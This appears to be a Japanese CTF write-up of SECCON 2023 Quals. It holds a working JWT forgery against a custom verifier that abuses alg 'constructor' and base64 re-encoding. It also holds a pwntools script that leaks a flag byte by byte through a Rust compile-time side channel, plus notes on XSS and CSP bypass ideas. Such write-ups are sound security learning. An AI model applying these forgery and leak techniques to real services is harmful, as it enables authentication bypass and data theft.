---
title: 'SECCON CTF 2023 Quals Writeup'
description: 'SECCON CTF 2023 QualsにチームWani Hackaseで出場しました。世界75/653位、国内29/334位という結果でした。'
tags: ['CTF', 'SECCON', 'Security', 'Web']
isPublished: true
publishedAt: '2023-09-23T18:30:00+09:00'
modifiedAt: '2023-09-23T18:30:00+09:00'
thumbnail: 'seccon2023-quals/result.png'
---

# SECCON CTF 2023 Quals Writeup

SECCON CTF 2023 QualsにチームWani Hackaseで出場しました。世界75/653位、国内29/334位という結果でした。

![](image://seccon2023QualsResult)

前半にWarmup問題を2つ解けたものの、そこから全く歯が立たず残念ながら10時間以上椅子を温めることになりました。

私が挑戦した問題のうちいくつかのWriteupを残しておきます。

## 解けた問題

### Bad JWT [web]

ペイロードが`{ isAdmin: true }`のJWTを偽造し、リクエストを投げるとフラグが手に入る問題です。

JWTの実装が自前で行われており、署名アルゴリズムとして`hs256`と`hs512`の2種類が用意されています。署名検証は、クライアントから送信されたJWTの署名とサーバー側で再計算した署名が一致するかを確認することで行われています。

脆弱性があるのは次の部分です。

```js
const algorithms = {
  hs256: (data, secret) =>
    base64UrlEncode(crypto.createHmac('sha256', secret).update(data).digest()),
  hs512: (data, secret) =>
    base64UrlEncode(crypto.createHmac('sha512', secret).update(data).digest()),
};

// 中略

const createSignature = (header, payload, secret) => {
  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
  const signature = algorithms[header.alg.toLowerCase()](data, secret);
  return signature;
};
```

`algorithms`オブジェクトには`hs256`と`hs512`の2つの署名関数が格納されています。`createSignature()`では`header.alg`に指定されたアルゴリズムをキーとして`algorithms`オブジェクトから署名関数を取り出し、`data`と`secret`を引数にして呼び出しています。

ここで、`alg`の値が検証されていないことに着目します。`alg`に`constructor`を指定すると、`alg['constructor']`すなわち`Object.prototype.constructor`を署名関数として使うことができます。

このとき署名は`Object.prototype.constructor`の返り値となりますが、`Object.prototype.constructor`の返り値は第一引数`data`のみで決まるため、`secret`を知らなくても署名を偽造できそうです。

ところが、この手法で愚直に生成した署名は次のようになります。

```js
stringifyPart({ typ: 'JWT', alg: 'constructor' });
// => eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9

stringifyPart({ isAdmin: true });
// => eyJpc0FkbWluIjp0cnVlfQ

createSignature({ typ: 'JWT', alg: 'constructor' }, { isAdmin: true }, '');
// => eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ
```

署名にピリオドが含まれてしまいました。したがって、JWTの値は次のようになります。

```js
jwt.sign('constructor', { isAdmin: true }, '');
// => eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ
```

このJWTにはピリオドが3つあるため、このままでは検証時のパースで弾かれてしまいます。

```js
const parseToken = (token) => {
  const parts = token.split('.');
  if (parts.length !== 3) throw Error('Invalid JWT format');

  // 中略
};
```

そこで、署名検証の実装が「クライアントから送信された署名をBase64デコードしたものと、サーバー側で再計算した署名をBase64デコードしたものが一致するか」であることに着目します。

```js
const verify = (token, secret) => {
  const { header, payload, signature: expected_signature } = parseToken(token);

  const calculated_signature = createSignature(header, payload, secret);

  const calculated_buf = Buffer.from(calculated_signature, 'base64');
  const expected_buf = Buffer.from(expected_signature, 'base64');

  if (Buffer.compare(calculated_buf, expected_buf) !== 0) {
    throw Error('Invalid signature');
  }

  return payload;
};
```

仮にクライアントから送信された署名とサーバー側で再計算した署名が異なっていたとしても、デコード結果が同じであれば検証を通過することがわかります。したがって、クライアントから送信する署名を次のようにBase64デコードしてから再エンコードすることで、署名からピリオドを消し検証を通過させることができます。

```js
Buffer.from(
  'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ',
  'base64',
).toString('base64');
// => eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ=
```

最終的なJWTは次のようになりました。これを送信するとフラグが手に入ります。

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ=
```

### crabox [sandbox]

サーバーに文字列を送信すると、その文字列とフラグが含まれるRustのソースコードが生成され、そのコンパイルを行ってくれるという問題です。

はじめはProcedural Macroか`build.rs`を書いてフラグを外部に送信しようと考えていたのですが、cargoではなくrustcを使った単一ファイルのコンパイルではどちらも使えませんでした。また、`const fn`を使ってフラグをどこかに出力しようかとも考えましたが、当然ながら`const fn`で外部と通信することはできませんでした。

しばらく一人で悩んでいたところでチームメンバーの発言をきっかけとして、コンパイルが成功したかどうかの情報がサーバーから返されていることを思い出しました。`const`文脈で`include_str!(file!())`を使えばソースコードの内容によってコンパイルの成功/失敗を変えられると考え、最終的には次のコードでソースファイルのnバイト目が特定の値であるかどうかを判別できるようにしました。

```rust
fn main() {}

const _: () = assert!(include_str!(file!()).as_bytes()[0] == 0x66);
```

実行時にpanicを起こすのではなくコンパイル時に失敗させるのに少し苦労しましたが、次の記事のおかげでうまくいきました。

https://tech-blog.optim.co.jp/entry/2021/12/03/080000#const_panic

この手法を使い、次のスクリプトでフラグを手に入れました。

```python
from pwn import *
from tenacity import retry


@retry
def try_char(pos, char):
    # io = process("pipenv run python app.py", shell=True)
    io = remote("crabox.seccon.games", 1337)
    io.recvuntil(b"__EOF__):\n")
    io.send(
        (
            f"}}const _:()=assert!(include_str!(file!()).as_bytes()[{110+pos:04}] == {ord(char):03});fn a(){{"
            + "\n__EOF__\n"
        ).encode()
    )
    l = io.recvline()
    io.close()
    if l == b":)\n":
        return True
    elif l == b":(\n":
        return False
    raise ValueError(b"Unexpected response:" + l)


def find_next_char(pos):
    for (
        c
    ) in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}!\"#$%&'()*+,-./:;<=>?@[\\]^_`|~":
        print(f"Trying {c}")
        if try_char(pos, c):
            return c
    raise ValueError("No char found")


current_flag = ""
c = ""
while c != "}":
    c = find_next_char(len(current_flag))
    print(f"Found {c}")
    current_flag += c
    print(f"Current flag: {current_flag}")
```

## 解けなかった問題

### SimpleCalc [web]

XSS問題です。Adminが持つCookieを使って`/flag`にリクエストを投げるとフラグが手に入ります。ただしCookieには`httpOnly`がついているため、JSから直接参照することはできません。

肝心のXSSですが、URLのHashで指定したJavaScriptが実行されます。したがってAdminに任意のJavaScriptを実行させることは次のように容易です。

```
http://simplecalc.seccon.games:3000/?expr=alert%281%29
```

しかし、CSPが次のように厳しく設定されているため、fetchなどで`/flag`へリクエストを投げることはできません。

```
Content-Security-Policy: default-src http://simplecalc.seccon.games:3000/js/index.js 'unsafe-eval';
```

どうにかhttpOnlyのCookieを取得できないか、あるいは`/flag`にリクエストを投げられないか考えたのですが、時間内には解けませんでした。

想定解は次のようなものだったようです。まず、`/js/index.js?expr=...`をService Workerとして登録することで、Service Worker上で任意のコードを実行できます。これを用いてレスポンスを改竄し、CSPヘッダーを削除するというものだそうです。

問題を解いている途中でService Workerを使う可能性は考えており、この問題の元ネタと思われる次のスライドも見つけていたのですが、任意のコードを実行可能なService Workerを登録できるとは思いつかず諦めていました。

https://www.docswell.com/s/hasegawa/KRXEGG-serviceworker

### blink [web]

こちらもXSS問題です。DOM Clobberingで解けるらしいです。Clobberingは途中で思いついていたものの、`document.body`を上書きできるとは思わず諦めていたので復習しておきます。

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering

## おわりに

途中で諦めて解けなかった問題が多かったことに悔いが残ります。思いついたことをなんでも雑にメモしたりチームメンバーに共有したりを意識すべきだったと感じています。

来年はWani Hackaseで本戦出場したいですね。
